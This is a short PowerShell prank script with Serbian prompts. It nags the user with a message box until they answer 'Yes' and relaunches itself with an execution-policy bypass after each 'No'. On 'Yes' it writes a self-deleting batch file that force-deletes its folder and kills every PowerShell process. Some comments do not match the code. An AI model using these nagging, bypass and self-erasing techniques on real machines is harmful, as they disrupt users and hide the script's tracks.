Add-Type -AssemblyName System.Windows.Forms

# Function to show a Yes/No message box
function Show-YesNoBox {
    param (
        [string]$message,
        [string]$title
    )

    $result = [System.Windows.Forms.MessageBox]::Show($message, $title, [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)
    return $result
}

# Prompt the user with a question
$answer = Show-YesNoBox -message "Da li je Lule NPC lider?" -title "Question"

# Check the answer
if ($answer -eq [System.Windows.Forms.DialogResult]::Yes) {
    # Specify the folder to delete
    cd C:/Users/Public/lule
    ./vrati.ps1
    $folderToDelete = "C:/Users/Public/lule"
    
    # Specify the path for the batch file
    $batchFilePath = "C:/Users/Public/delete.bat"

    # Batch file content
    $batchFileContent = @"
@echo off
cd C:\Users\Public
timeout /t 5 /nobreak > nul
powershell rm -Recurse -Force lule
del "%~f0"
"@

    # Create the batch file
    Set-Content -Path $batchFilePath -Value $batchFileContent
    
    # Run the delete.bat file
    Start-Process -NoNewWindow $batchFilePath
    
    # Stop the main PowerShell script
    Stop-Process -Name "powershell" -Force
}
else {
    [System.Windows.Forms.MessageBox]::Show("Pogresan odgovor pitam opet za 5 minuta", "Incorrect Answer", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    
    # Wait for 5 secondsr
    
    # Re-run the script
    cd C:/Users/Public/lule
    Start-Process -NoNewWindow -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass .\mafija.ps1"
}
